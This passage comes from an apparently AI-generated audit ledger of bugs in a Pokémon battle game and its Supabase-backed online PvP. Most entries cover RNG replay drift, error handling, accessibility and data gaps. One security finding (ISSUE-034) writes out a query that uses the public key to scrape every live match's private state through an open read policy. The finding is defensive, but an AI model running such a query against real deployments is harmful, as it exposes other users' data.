**Blast radius**: §8 ordering rule `itinerary → wild → wager prompt → trainer` is unverifiable since wager hook missing. `_compareTeamSlotForWager` (worst/best helpers spec'd in §6) absent; spec's flow-checklist row "Full PC + party → do not show wager if winning transfer has nowhere to go" also unimplemented.

**Fix sketch**: Add `sm.pendingWager` to save schema (migrateStoryPreV20), implement `_rollWagerForRouteBattle(eventIdx)` 15% trigger inside `proceedToNextBattle`, write `_pickFoeWorstSlot` / `_pickPlayerBestSlot` helpers near `rollTrainerTeam` (~32290), and add accept / decline UI in the battle intro flow.

**Verification**: Force `sm.pendingWager = true` via dev seed, fight a Basic Trainer, see wager prompt; on win the foe's worst grade mon transfers to PC.

---

## <a id="ISSUE-031"></a> ISSUE-031: Turn-order priority breakers (Quick Claw, speed-tie, rampage duration) use bare `Math.random()`

---
id: ISSUE-031
severity: P1
category: bug
anchor_symbol: playTurn
current_line_hint: ~19353
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 22f3b567bfd3
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Turn-order priority breakers (Quick Claw, speed-tie, rampage duration) use bare `Math.random()`

**Evidence**:
```js
// battle.html:19353-19354 (Quick Claw 20% proc, both sides)
if (_pItemActiveQC && state.pActive.item === "Quick Claw" && Math.random() < 0.2) { pPri += 0.4; ... }
if (_fItemActiveQC && state.fActive.item === "Quick Claw" && Math.random() < 0.2) { fPri += 0.4; ... }
// battle.html:19368 (speed-tie tiebreak)
else if (fSpe === pSpe) pGoesFirst = Math.random() > 0.5;
// battle.html:19762 (rampage lock duration after Outrage / Petal Dance / Thrash)
attacker.volatile.lockTurns = 1 + Math.floor(Math.random() * 2);
```

Quick Claw + speed tie alone can flip an entire turn's order. Rampage duration affects fatigue confusion timing (fatigue site at 19772 IS gated, but the duration that triggers it isn't).

**Repro**: Two mons with identical Speed, both holding Quick Claw, both with rampage moves. Two replays of the same seed diverge on turn 1.

**Blast radius**: Turn-order tiebreaks influence every subsequent interaction in the turn. Full-team replays cascade out of sync within ~2 turns.

**Fix sketch**: Route all three sites through `const _r = (sm && sm.active) ? storyRngNext : Math.random;`.

**Verification**: `tests/property/priority-order.test.js` should still pass; new test: speed-tie with identical builds + same seed → consistent winner.

---

## <a id="ISSUE-032"></a> ISSUE-032: End-of-turn residual block is not try-wrapped — any throw masks as "Turn skipped" + skips residuals

---
id: ISSUE-032
severity: P1
category: bug
anchor_symbol: playTurn
current_line_hint: ~20127
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 7496103ecc97
confidence: high
status: open
---

**Title**: End-of-turn residual block is not try-wrapped — any throw masks as "Turn skipped" + skips residuals

**Evidence**:
```js
// playTurn inner try; NO per-call guard around these:
runVolatileTimers();
runWishHealing();
endOfTurnEffects(state.pActive, state.fActive); endOfTurnEffects(state.fActive, state.pActive);
tickWeather();
if (state.pActive.dynamaxed) { state.pActive.dynamaxTurns--; ... }   // throws if pActive null
state.residualPhaseComplete = true;          // never reached on throw
// ... only handler is catch(err) at 20154 -> logMsg("Turn skipped") + isLocked=false
```

**Repro**: Static: lines 20127-20151 sit between the inner `try{` (opens ~19990) and `catch(err)` at 20154 with no intervening try. If `endOfTurnEffects`/`tickWeather`/`runWishHealing` throws (e.g. on a mon with cleared `volatile`, or `state.pActive` null after a double-faint edge), control jumps to the catch: poison/burn/weather damage, Speed-Boost tick, Dynamax countdown, and `turnCount++` are all skipped, and the user only sees "[Error: … Turn skipped.]". `state.residualPhaseComplete` stays false, so the NEXT forced-switch may re-run residuals (double-tick). This is the same silent-failure class as the fixed `sm` bug.

**Blast radius**: All EoT effects (status/weather DoT, Leftovers, Wish, Speed Boost, Slow Start, Dynamax countdown). A recurring throw here is invisible except as periodic "Turn skipped".

**Fix sketch**: Wrap each EoT call (or the whole block) in its own try/catch that logs a distinct channel and still sets `residualPhaseComplete = true`, so one failing handler doesn't abort the rest of the turn and doesn't masquerade as a generic turn-skip.

**Verification**: Force `endOfTurnEffects` to throw (e.g. delete `state.pActive.volatile`) and assert subsequent residuals still run and `turnCount` increments.

---

## <a id="ISSUE-033"></a> ISSUE-033: `pushData` queue keeps advancing after a write fails — `_pushDataImpl` errors are swallowed to `console.warn`, leaving local state diverged from Supabase

---
id: ISSUE-033
severity: P1
category: bug
anchor_symbol: pushDataQueue
current_line_hint: ~463
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 28d225daff16
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `pushData` queue keeps advancing after a write fails — `_pushDataImpl` errors are swallowed to `console.warn`, leaving local state diverged from Supabase

**Evidence**:
```js
// online-pvp.js L463-494
pushData(patch, existingData) {
    const sb = getClient();
    if (!sb || !roomId) return Promise.resolve();
    const op = pushDataQueue.then(() => this._pushDataImpl(patch, existingData));
    pushDataQueue = op.catch((e) => {
        console.warn('[OnlinePvP] pushData queue', e);     // <-- swallows, queue advances
    });
    return op;                                              // caller can await rejection,
                                                            // but no caller actually catches.
},
async _pushDataImpl(patch, existingData) {
    // ...
    const { error: upErr } = await sb.from('pvp_rooms')
        .update({ data, updated_at: new Date().toISOString() }).eq('id', roomId);
    if (upErr) console.warn('[OnlinePvP] pushData update failed', upErr);  // <-- not thrown
},
```

**Repro**: Pull the network on the host mid-battle. `pushData({ battle, ... }, prev)` at L547/L571/L630 await the rejection (or in the upErr case, it returns normally because the `update` error is only console.warned), so callers don't see the failure. The guest never receives the seq bump, the host's local `state` reflects "p1 picked move", and the next turn proceeds locally — desync. Worse: if `_pushDataImpl` throws (e.g., the select at L478 fails), the queue's `.catch()` healing means the *next* `pushData` proceeds as if nothing happened, with no retry of the lost write.

**Blast radius**: All host-authoritative updates: draft progression (L399), draft deadline (L406, L410), p1/p2 pick submission (L547, L571), turn resolution (L630), end-of-round wins (L654), battle start (L716). The serialization is correct (queue preserves order), but the failure-handling contract is broken in two ways: (1) `update` errors at L493 are not thrown, so the queued op resolves "successfully" with bad data, and (2) `select` errors at L481-485 are thrown but only `console.warn`ed by the queue, with no upstream signal — `pushData(...)`'s return value rejects but every callsite uses `await this.pushData(...)` without a `try/catch`, so the rejection bubbles all the way up to the function that called `handlePvPPlayTurn`/`_hostRunResolution`, where it's *also* not caught (those functions don't try-wrap pushData), and ultimately reaches the user's click handler with an unhandled rejection.

**Fix sketch**: (a) Throw on `upErr` at L493 (`if (upErr) throw upErr`) so the queue knows the write actually failed. (b) Add a `pushDataFailed` callback on the OnlineBattle object that signals "we lost sync — UI should show a 'reconnecting' banner". (c) On select/update failure, retry once with exponential backoff before declaring the write lost. (d) Every call site that needs durable confirmation (turn submission, end of round) should `try/catch` the await and surface an inline error to the player ("network hiccup — your move was not sent").

**Verification**: Add a test that injects an `update` error response and asserts: (1) `pushData(patch).then(...).catch(handler)` reaches `handler`, (2) a follow-up `pushData(patch2)` still runs (queue doesn't stall — important), and (3) a `pushDataFailed` event fires with both patches' info.

---

## <a id="ISSUE-034"></a> ISSUE-034: `pvp_rooms` SELECT policy is `using (true)` — anyone with the public key can scrape every live match's full draft + battle state

---
id: ISSUE-034
severity: P1
category: security
anchor_symbol: pvp_rooms_select
current_line_hint: ~31
file: supabase/migrations/001_online_pvp.sql
agents: [pvp-concurrency-hunter]
fingerprint: c6b9e9e968bd
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `pvp_rooms` SELECT policy is `using (true)` — anyone with the public key can scrape every live match's full draft + battle state

**Evidence**:
```sql
-- supabase/migrations/001_online_pvp.sql L31-35
drop policy if exists "pvp_rooms_select" on public.pvp_rooms;
create policy "pvp_rooms_select"
  on public.pvp_rooms for select
  to anon, authenticated
  using (true);
```

**Repro**: With the publishable key (which is hardcoded in `online-config.js` and shipped to every browser), an attacker runs `client.from('pvp_rooms').select('code, data').range(0, 999)` and gets every live room's code, draft picks (p1/p2 pool, p1/p2 draft), p1_pick/p2_pick (the move each player just selected), and `battle_log_html` (the full battle commentary). Subscribing to `postgres_changes` on `pvp_rooms` gives realtime spectator access to every match without joining.

**Blast radius**: Competitive integrity for ranked-style play (other player can see what you drafted before you commit your pick). Privacy: display names are tied to rooms; an attacker can map "Trainer Alice" to "Trainer Bob" across many matches. Codes are leaked, so anyone watching can join as the second player into a room that hasn't filled yet (though the atomic `try_join_pvp_room` RPC ensures only one guest can actually claim it).

**Fix sketch**: Restrict SELECT to participants. Two approaches: (a) require a token-bearing RPC (`get_room_for_participant(p_room_id, p_token)`) that returns the row only if `p_token` matches `data->>'host_token'` or `data->>'guest_token'`; client-side `select` is denied. (b) Keep SELECT permissive on the `code` column only (so join-by-code works) and gate the `data` column with a column-level grant — but PostgREST + jsonb makes this awkward. (a) is cleaner.

**Verification**: From a non-participant client, `select * from pvp_rooms` must return 0 rows (or only rows where the requesting token matches).

---

## <a id="ISSUE-035"></a> ISSUE-035: `remoteRowQueue` has no timeout — a hung `onOnlineRoomData` (e.g., a UI promise that never resolves) freezes ALL future remote updates

---
id: ISSUE-035
severity: P1
category: bug
anchor_symbol: remoteRowQueue
current_line_hint: ~496
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 564feb239c3e
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `remoteRowQueue` has no timeout — a hung `onOnlineRoomData` (e.g., a UI promise that never resolves) freezes ALL future remote updates

**Evidence**:
```js
// online-pvp.js L496-508
_onRemoteRow(newRow) {
    if (!newRow) return;
    remoteRowQueue = remoteRowQueue
        .then(async () => {
            const d = newRow.data || {};
            if ((d.seq || 0) <= lastRemoteSeq) return;
            lastRemoteSeq = d.seq || lastRemoteSeq + 1;
            if (typeof global.onOnlineRoomData === 'function') {
                await Promise.resolve(global.onOnlineRoomData(d, { role, roomCode }));
                //          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                //          unbounded — onOnlineRoomData calls startBattle() at L14711,
                //          guestApplyBattleStart() at L14716, guestApplyBattleBlob()
                //          at L14728, consumeRemoteForHost() at L14724 — any UI
                //          promise that never resolves locks the whole channel.
            }
        })
        .catch((e) => console.warn('[OnlinePvP] onOnlineRoomData', e));
},
```

**Repro**: In `guestApplyBattleStart` (L743), the function calls `global.AudioSystem.startNewBattle()` which is wrapped in try/catch — but what about `global.updateUI()` at L768 or `global.applyBattleLogDockClass()` at L773? If any of those `await`s an animation promise or a modal close that depends on user interaction, the queue chain blocks until that promise settles. From that moment on, every future `_onRemoteRow` (every pushData echo, every opponent move) sits in the queue waiting. The realtime subscription is still receiving events, but they pile up behind a stuck `await`. The host has no signal that the guest is stuck. The integration test at `tests/integration/pvp-stub.test.js:75-90` validates serialization but doesn't exercise the hang-recovery path.

**Blast radius**: The whole live-sync layer freezes on a single bad handler invocation. The user sees their input go through (local state changes), but the opponent's responses never appear. Symptom: "the game froze, my opponent's screen says it's their turn but they say it's mine."

**Fix sketch**: Race the handler against a timeout: `await Promise.race([handler, new Promise((_, rej) => setTimeout(() => rej(new Error('onOnlineRoomData timeout')), 30_000))])`. On timeout, log loudly, possibly tear down the channel and reconnect (the `_subscribe` path is idempotent — `removeChannel` then re-create). Alternatively, decouple the queue from the handler: the queue's job is to enforce sequence ordering, not to wait on UI; once the seq check passes, fire-and-forget the handler call with its own error boundary, so a hung handler never blocks subsequent seq updates.

**Verification**: Add a test that mocks `global.onOnlineRoomData = () => new Promise(() => {})` (never resolves), call `_onRemoteRow({ data: { seq: 1 } })`, then `_onRemoteRow({ data: { seq: 2 } })`, then wait 35s. Assert that the queue did *not* block the seq:2 row's handler (or that a reconnect was triggered).

---

## <a id="ISSUE-036"></a> ISSUE-036: Player-facing city actions read "Pokemon League" / "Pokemon Fan Club" (no diacritic)

---
id: ISSUE-036
severity: P1
category: inconsistency
anchor_symbol: renderCityActions
current_line_hint: ~29067
file: battle.html
agents: [consistency-auditor]
fingerprint: 3422a6976f0b
confidence: high
status: open
---

**Title**: Player-facing city actions read "Pokemon League" / "Pokemon Fan Club" (no diacritic)

**Evidence**:
```js
// 29067 — City9 action list (rendered verbatim as a button label)
[59,'City','City9',null,0,['Link Station',/*…*/,'Power Up','Enter Pokemon League']],
// 29101/29106 — Fan Club spliced into every city's action list
if (!Array.isArray(actions) || actions.includes('Pokemon Fan Club')) continue;
actions.splice(insertAt + 1, 0, 'Pokemon Fan Club');
// 38824 / 38984 — same bare labels consumed by the renderer
const hasLeague = actions.includes('Enter Pokemon League');
if (actions.includes('Pokemon Fan Club') && _tutorTeam) { … }
```

**Repro**: Start any story run; the City 9 hub renders an "Enter Pokemon League" button and every city renders a "Pokemon Fan Club" button — both without the é, while the rest of the UI (screen titles "💖 Pokémon Fan Club" @8472, "Pokémon League" blurb @30950, arrival lines) uses "Pokémon". The two strings are the only *player-visible* bare-"Pokemon" occurrences; the other ~20 hits in the file are all CSS/JS comments.

**Blast radius**: Two of the most-clicked buttons in the game. The mismatch is visible side-by-side with correctly-accented labels on the same hub screen. Low code risk, high polish cost.

**Fix sketch**: Change the two literals to "Enter Pokémon League" and "Pokémon Fan Club", then update the matching `.includes('Pokemon Fan Club')` / `.includes('Enter Pokemon League')` dispatch checks (29101, 38824, 38947-38993) in lockstep — these are string-equality dispatches, so label and check must change together.

**Verification**: `grep -nE "'(Pokemon Fan Club|Enter Pokemon League)'" battle.html` returns 0; both buttons still open their screens (Fan Club splice + League gate still match).

---

## <a id="ISSUE-037"></a> ISSUE-037: Draft pick cards are click-only <div>s — keyboard/SR users cannot select a Pokémon

---
id: ISSUE-037
severity: P1
category: a11y
anchor_symbol: renderDraft
current_line_hint: ~15848
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 27b0bb57fb3a
confidence: high
status: open
---

**Title**: Draft pick cards are click-only <div>s — keyboard/SR users cannot select a Pokémon

**Evidence**:
```js
let btn = document.createElement('div'); btn.className = `draft-card tier-${tier}`;
// ...no tabindex, no role, no keydown added...
btn.onclick = () => { btn.onclick = null; selectDraft(draftItem); }; grid.appendChild(btn);
```

**Repro**: Open Draft screen (PvP / gauntlet). Tab through the grid — the cards never receive focus; Enter/Space do nothing. Only the inner info `<button>` is reachable. Drafting is impossible without a mouse/touch.

**Blast radius**: REDESIGN_PLAN §6 explicitly reuses this exact pipeline (`renderDraft`) for the new Fight Club 5-round gauntlet draft — the operability blocker propagates into the new screen unless fixed here.

**Fix sketch**: Build the card as `<button type="button">` (or add `role="button" tabindex="0"` + a keydown handler firing on Enter/Space). Keep the inner info button as a real nested control or move it out to avoid nested interactive elements.

**Verification**: Tab reaches each card, focus ring shows (global :focus-visible at L54 already covers it), Enter selects. Re-test in the new Fight Club draft.

---

## <a id="ISSUE-038"></a> ISSUE-038: `No Item` sentinel string used in 11 build slots is absent from `data/items.json`

---
id: ISSUE-038
severity: P1
category: data
anchor_symbol: resolveCsvBuildEntry
file: data/builds/gen8.json
agents: [data-integrity-auditor]
fingerprint: 5359999bcf35
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `No Item` sentinel string used in 11 build slots is absent from `data/items.json`

**Evidence**:
```json
"Vileplume": { "nu": { "Defensive": {"item": ["Black Sludge", "No Item"], ...} } }
"Ninjask":   { "pu": { "Swords Dance": {"item": ["Heavy-Duty Boots", "No Item"], ...} } }
"Giratina":  { "godlygift": { "Wall": {"item": ["Leftovers", "No Item"], ...} } }
```

**Repro**: `node scripts/debug/data-validator.mjs` reports `[P1] 1 items referenced by builds are missing from items.json — No Item (11 build(s))`. Affects gen8.json (6) and gen9.json (5).

**Blast radius**: When `makeBuild` rolls a slot whose `item` array picks `"No Item"`, the mon's `item` becomes the literal string `"No Item"`. The engine handles this as a sentinel (`battle.html` lines 13134-13136 fall through to `'No Item'` as a default), so combat works. But: the tooltip dictionary populated from `items.json` has no entry, so any UI showing the mon's held item will not render a tooltip, and any code that does `itemsJSON[norm('No Item')]` for legality/effects gets `undefined` and may treat it as a missing entry.

**Fix sketch**: Either (a) add a single placeholder entry in `data/items.json` (gen 1, `name: "No Item"`, `shortDesc: "No held item."`) so consumers can look it up uniformly, or (b) migrate the 11 build slots to use `null` / omit the alternative entirely and document that "no held item" is encoded as absence rather than a sentinel string. Option (b) is more invasive but cleaner.

**Verification**: Re-run `node scripts/debug/data-validator.mjs`; the missing-items finding should drop to 0. Spot-check a build that previously had `"No Item"` in its item array (e.g., Vileplume `nu/Defensive`) and confirm the rolled mon gets the alternative held item when "No Item" was selected.

---

## <a id="ISSUE-039"></a> ISSUE-039: showScreen() does no focus management on story-screen transitions — focus is orphaned

---
id: ISSUE-039
severity: P1
category: a11y
anchor_symbol: showScreen
current_line_hint: ~48565
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 00376bc90497
confidence: high
status: open
---

**Title**: showScreen() does no focus management on story-screen transitions — focus is orphaned

**Evidence**:
```js
function showScreen(id) {
    document.querySelectorAll('.screen,.modal').forEach(el=>el.classList.add('hidden'));
    const el = document.getElementById(id);
    if (el) el.classList.remove('hidden');
}
```

**Repro**: With a screen reader / keyboard, move between any story service screens (city → shop → professor → catch). The previously focused control gets `.hidden`; focus falls back to `<body>`, so SR users lose their place and keyboard users must re-Tab from the top of the document on every transition.

**Blast radius**: Every `#screen-story-*` navigation (15+ screens), plus the new daycare/hatch and Fight Club screens that will route through the same `showScreen`. Regions already carry `role="region" aria-label`, so the labeling exists — only focus delivery is missing.

**Fix sketch**: After unhiding, move focus to the new screen's heading or first interactive element (e.g. give the screen `tabindex="-1"` and `.focus()`, or focus its `h2/h3`). Optionally announce via an `aria-live` status.

**Verification**: SR announces the new screen's name/heading on each transition; keyboard Tab starts inside the new screen.

---

## <a id="ISSUE-040"></a> ISSUE-040: Mechanics-unlock docs still describe one-per-gym drip; code now unlocks all four at Colress/City 6

---
id: ISSUE-040
severity: P1
category: inconsistency
anchor_symbol: slotsUnlocked
current_line_hint: ~42749
file: battle.html
agents: [spec-drift-auditor]
fingerprint: b088e5373276
confidence: high
status: open
---

**Title**: Mechanics-unlock docs still describe one-per-gym drip; code now unlocks all four at Colress/City 6

**Evidence**:
```js
// battle.html ~42742 (also a mirror at ~38575 and dev-seeder at ~38702):
const slotsUnlocked = badges < 5 ? 0 : 4;          // ALL four at badges>=5
sm.unlockedGimmicks = order.slice(0, Math.min(slotsUnlocked, order.length));
// inline comment: "Previously these dripped one per gym (5->8) ... Unlock all
//                  four player battle mechanics together the moment ... Colress"
```
```text
docs/PROGRESSION_CURVE_MASTER.md:182 (marked "✅ verified live"):
  `slotsUnlocked = badges < 5 ? 0 : min(4, badges−4)`; order mega → dmax → tera → z.
:183  - Badges 1–4 = 0 · GL5→1 · GL6→2 · GL7→3 · GL8→4.
```

**Repro**: Win Gym 5 (badges→5) with all four mechanics enabled in run setup; `sm.unlockedGimmicks` is `['mega','dmax','tera','z']` immediately. The doc says only 1 slot should be open until GL8.

**Blast radius**: This is a doc-vs-code contradiction, not a code bug. Docs that must be updated to match the merged rule (`badges < 5 ? 0 : 4`):
- `docs/PROGRESSION_CURVE_MASTER.md` §2e line 182 (the `min(4, badges−4)` formula — and drop the "✅ verified live" tag, it is now false), line 183 (the `GL5→1 · GL6→2 · GL7→3 · GL8→4` enumeration), and line 181's stale anchor `battle.html:42146` (real sites are ~38575 and ~42749).
- `docs/PROGRESSION_CURVE_MASTER.md` master-timeline `Gmk` column: line 94 ("→ Badge 5 → FIRST GIMMICK SLOT"), line 95 (row idx 32 Gmk=1), line 96 (idx 33 Gmk=1), line 97 (idx 34 Gmk=1), line 101 (idx 38 "2 gimmick slots"), line 109 (idx 46 "3 gimmick slots"), line 116 (idx 53 "Badge 8 → 4 gimmick slots") — every `Gmk` cell for badges 5–7 should read 4, not 1/2/3.
- `docs/PROGRESSION_CURVE_MASTER.md` §3.1 F2 (line 230) and §3.3 line 204 still frame "gimmicks unlock at GL5 [singular] ... Colress debuts C6" — the count is now four-at-once, so the "holds one unusable unlock for one stage" framing should become "holds all four for one stage until Colress."
- `STORY_MODE_FLOW.md` §15d line 722-723 ("Cable Link only rolls gimmicks the player has unlocked **via gym victories**") reads as per-gym; soften to "unlocked at the Colress/Gym-5 gate."

Note also a minor code wart surfaced while verifying: the `?storychampionweak=1` dev seeder at ~38702 still uses `Math.min(8, order.length)` (stale `8`) instead of the `slotsUnlocked` rule; functionally equivalent for a maxed run (min(8,4)=4) but inconsistent with the two real sites.

This also OBSOLETES ledger `ISSUE-152` (P3, "DMax unlocks at Gym 5 instead of Gym 6 if Mega is off") — the new all-at-once rule means disabling a mechanic can no longer shift another's unlock gym. Verify-and-close, don't re-open.

**Fix sketch**: Docs-only. Update `PROGRESSION_CURVE_MASTER.md` §2e + the `Gmk` timeline column + §3.1 F2 to the "all four enabled gimmicks unlock together at badges>=5 (post-GL5), equippable at Colress/City 6" rule. Optionally clean the stale `8` in the dev seeder.

**Verification**: After doc edit, `grep -n "min(4, badges\|GL5→1\|FIRST GIMMICK SLOT" docs/PROGRESSION_CURVE_MASTER.md` returns nothing; the `Gmk` column shows 4 for every row with badges>=5.

---

## <a id="ISSUE-041"></a> ISSUE-041: Reaper's Toll uses bare IIFE-private `storyRngNext` — guard always false, breaks seeded replays

---
id: ISSUE-041
severity: P1
category: inconsistency
anchor_symbol: storyRngNext
current_line_hint: ~24081
file: battle.html
agents: [consistency-auditor]
fingerprint: 80dcfb8449c7
confidence: high
status: open
---

**Title**: Reaper's Toll uses bare IIFE-private `storyRngNext` — guard always false, breaks seeded replays

**Evidence**:
```js
// lines 24081 / 24089 / 24139 / 24147 (outside StoryMode IIFE)
const cursed = foeSurvivors[Math.floor((typeof storyRngNext !== 'undefined' ? storyRngNext() : Math.random()) * foeSurvivors.length)];
```

**Repro**: `storyRngNext` is declared only at line 31874 inside the StoryMode IIFE (no bare export). At battle-engine scope `typeof storyRngNext` is always `'undefined'`, so all four Reaper's Toll sites silently fall through to `Math.random()` even in a seeded story battle.

**Blast radius**: Same RNG-replay-drift class as the 11 `sm` sites already fixed. The "cursed survivor" pick diverges between an original story run and its seeded replay; story-replay.mjs determinism checks will not catch it because the branch never enters the seeded path.

**Fix sketch**: Use the script-top idiom already used 16x elsewhere: `(s && s.active && typeof window.storyRngNext === 'function') ? window.storyRngNext : Math.random` (or route through the new `storyAwareRng()` helper).

**Verification**: grep `typeof storyRngNext` in battle.html returns 0 outside-IIFE hits; replay a Reaper's Toll battle twice with same seed and confirm identical survivor weakened.

---

## <a id="ISSUE-042"></a> ISSUE-042: Pokémon Trader (STORY_FEATURES_INTEGRATION.md §7) at City4 still missing

---
id: ISSUE-042
severity: P1
category: inconsistency
anchor_symbol: traderOfferByCity
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 5ccd1b40734e
confidence: high
status: wontfix-DE-SCOPED-permanent
---

**Title**: Pokémon Trader (STORY_FEATURES_INTEGRATION.md §7) at City4 still missing

**Evidence**:
```
$ grep -niE 'traderOffer|enterTrader|tradeMon|fixedTrade|cityTrader|traderHouse' battle.html
(no matches)
```

**Repro**: Visit City4 on first arrival (event idx 26) or post-gym (event idx 29) — no Trader NPC offers a same-grade fixed trade. Spec calls for a single City4 trader generating a 1:1 same-grade species swap, frozen on first generation, both species from enabled gens.

**Blast radius**: Smallest scope from the spec checklist (§17.6 — "half-day"), but still unshipped after 6+ months. Could land independently of itinerary / wager / black market.

**Fix sketch**: Add `sm.traderOfferByCity = {}` save field, `_generateTraderOffer(cityIdx, enabledGens)` near `_pickStarterPartner` (~36819), render the City4 Trader button alongside Safari Zone in `renderCityActions`.

**Verification**: Enter City4 on first visit; Trader NPC offers e.g. Ralts ↔ Riolu (both G2); accept swaps the party slot; revisit City4 — same frozen offer (or marked traded).

---

## <a id="ISSUE-043"></a> ISSUE-043: Speed-tie resolution + Quick Claw + lock-turn duration all use bare `Math.random()` in the turn loop

---
id: ISSUE-043
severity: P1
category: bug
anchor_symbol: turn-resolution
current_line_hint: ~19368
file: battle.html
agents: [consistency-auditor]
fingerprint: 91037ef383da
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Speed-tie resolution + Quick Claw + lock-turn duration all use bare `Math.random()` in the turn loop

**Evidence**:
```js
// L19353-19354 (Quick Claw — should be deterministic in story)
if (_pItemActiveQC && state.pActive.item === "Quick Claw" && Math.random() < 0.2) { pPri += 0.4; ... }
if (_fItemActiveQC && state.fActive.item === "Quick Claw" && Math.random() < 0.2) { fPri += 0.4; ... }
// L19368 (speed tie)
else if (fSpe === pSpe) pGoesFirst = Math.random() > 0.5;
// L19762 (locking move turn count — Outrage/Thrash/Petal Dance)
attacker.volatile.lockTurns = 1 + Math.floor(Math.random() * 2);
// L20077 (Sleep Talk picks a random move)
let sleepTalkPick = validMoves[Math.floor(Math.random() * validMoves.length)];
```

**Repro**: Story battle, seed it, give the foe a Quick-Claw holder. Two replays of the same seeded turn will not see the same Quick-Claw procs. Speed-tie between two mons with the same Speed: ditto.

**Blast radius**: Order-of-actions is the highest-leverage RNG in the engine — first-strike flips entire battles. Speed-tie and lock-turn divergence propagate through the rest of the run.

**Fix sketch**: At the top of the turn-resolution closure that owns these branches, bind `_rng = (sm && sm.active) ? storyRngNext : Math.random` and use it for every priority/turn-count decision. Lock-turn count and Sleep Talk picks should also be on `_rng`.

**Verification**: Seeded replay where both sides field equal-Speed mons; assert action order matches across runs. Quick-Claw-holder seeded fight: assert proc/no-proc parity.

---

## <a id="ISSUE-044"></a> ISSUE-044: `???` type used by gen1 `bide` and gen4 `curse` is not defined in `typeChart`

---
id: ISSUE-044
severity: P1
category: data
anchor_symbol: typeChart
current_line_hint: ~9941
file: battle.html
agents: [data-integrity-auditor]
fingerprint: 72e49ce309b5
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `???` type used by gen1 `bide` and gen4 `curse` is not defined in `typeChart`

**Evidence**:
```js
// battle.html ~9941
const typeChart={"Normal":{...},"Fire":{...}, ... /* 18 entries, no "???" */};

// data/moves.json gen4.curse
{ "type": "???", "desc": "If the user is not a Ghost type, lowers Speed by 1 stage ..." }
```

**Repro**: `node -e "const moves=JSON.parse(require('fs').readFileSync('/home/user/battle/data/moves.json','utf8')); for (const g of Object.keys(moves)) for (const k of Object.keys(moves[g])) if (moves[g][k].type==='???') console.log(g,k);"` prints `1 bide` and `4 curse`. Grep the typeChart literal: `???` is absent.

**Blast radius**: The live engine only loads gen9 moves (`movesJSONOrig['9']`), where `curse` is `Ghost` and `bide` is `Normal`, so today the runtime never observes a `???` type. However, any tooling that reads earlier gens from `moves.json` (e.g., a dex/format browser, a learnset preview that walks the inheritance chain) will look up `typeChart["???"]` and receive `undefined`, causing all subsequent damage-multiplier math to fall back to `1` silently. This is also a load-bearing assumption for any future gen-toggle feature.

**Fix sketch**: Either remove the gen4 `curse.type === "???"` data (replacing it with the Showdown-canonical `Normal` typing it had in gen4) or add a `"???"` entry to `typeChart` with all neutral (`1×`) effectiveness so legacy-data consumers don't get `undefined`. The first option matches engine behavior; the second preserves the original Showdown export verbatim.

**Verification**: After the fix, `Object.keys(typeChart).includes('???')` is true (option B) or `moves.json` has no `???` types (option A). Either way, `node scripts/debug/data-validator.mjs` should pass without warnings about the typeless move.

---

## <a id="ISSUE-045"></a> ISSUE-045: 7 duplicated `select('data').eq('id', roomId).single()` fetch+error blocks in online-pvp.js

---
id: ISSUE-045
severity: P2
category: refactor
anchor_symbol: _hostRunResolution
current_line_hint: ~588
file: online-pvp.js
agents: [consistency-auditor]
fingerprint: 52cc0edfbc71
confidence: high
status: open
---

**Title**: 7 duplicated `select('data').eq('id', roomId).single()` fetch+error blocks in online-pvp.js

**Evidence**:
```js
// L478, L534, L559, L610, L639, L672, L710 — all match this shape:
const { data: row, error: rowErr } = await sb.from('pvp_rooms').select('data').eq('id', roomId).single();
if (rowErr || !row || row.data == null) {
    console.warn('[OnlinePvP] <label> fetch', rowErr);
    return;
}
const prev = row.data;
```

**Repro**: `grep -nE "select\\('data'\\)\\.eq\\('id', roomId\\)\\.single\\(\\)" online-pvp.js` returns 7 sites with near-identical follow-on error handling.

**Blast radius**: Maintenance only — if Supabase API surface changes, every site needs the same edit. Risk of one fetch getting fixed and others diverging. No runtime bug.

**Fix sketch**: Extract a single `async function _fetchRoomData(label)` helper that returns `{ data, error }` or `null` on failure, logs once, and lets call sites focus on logic. Probably 10-15 lines of shared code.

**Verification**: Run existing online-PvP integration tests after refactor; no behavior change expected.

---

## <a id="ISSUE-046"></a> ISSUE-046: Build "illegal-ability" pairs (672) are intended (hackmons/AAA + mega-form abilities); a naive legality check false-positives

---
id: ISSUE-046
severity: P2
category: inconsistency
anchor_symbol: _isBuildAbilityIllegal
current_line_hint: ~9919
file: battle.html
agents: [data-integrity-auditor]
fingerprint: 6a7b7ae22cca
confidence: medium
status: open
---

**Title**: Build "illegal-ability" pairs (672) are intended (hackmons/AAA + mega-form abilities); a naive legality check false-positives

**Evidence**:
```js
// loadBuildsCSV already gates illegal abilities at load — this IS the legality model:
if (Array.isArray(buildObj._abilityOptions)) {
  const legalAbilities = buildObj._abilityOptions.filter(a => !_isBuildAbilityIllegal(name, a));
  if (legalAbilities.length === 0) { buildObj._illegal = true; illegalCount++; }
} else if (_isBuildAbilityIllegal(name, buildObj.a)) { buildObj._illegal = true; illegalCount++; }
// 672 build species::ability "violations" vs species.json abilities; ~634 are
// free-ability metagames (almostanyability/balancedhackmons/purehackmons/1v1/mixandmega);
// the rest are mega-form abilities (e.g. Charizard/ou "Tough Claws" = charizardmegax).
```

**Repro**: Cross-ref each build's `ability` against `species.json[species].abilities`. 672 distinct pairs mismatch; filtering free-ability tiers leaves ~38, all mega/form-transition (verified: `charizardmegax` carries Tough Claws, `dianciemega` carries Magic Bounce, etc.).

